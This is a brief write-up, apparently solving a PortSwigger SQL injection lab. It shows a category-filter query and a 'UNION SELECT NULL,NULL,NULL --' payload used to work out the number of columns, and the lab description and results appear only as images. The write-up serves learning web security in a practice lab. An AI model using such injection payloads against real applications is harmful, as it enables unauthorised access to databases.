## Lab Description: 

<img width="876" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/331e7461-3db2-49bc-a5ea-562d98569848">

## Solution:

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/9011557b-e850-4839-a780-3eb1128ad3c7)

*Query*

SELECT * FROM tableName WHERE category = 'Pets'

As per the requirement of Lab Task we have to add "UNION SELECT NULL --" as payload in query parameters but we don't know the number or Columns

" SELECT * FROM someTable WHERE category = '' UNION SELECT NULL,NULL,NULL -- "

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/03fa94f5-fb5f-4a91-b6e8-50d6d8d5e564)

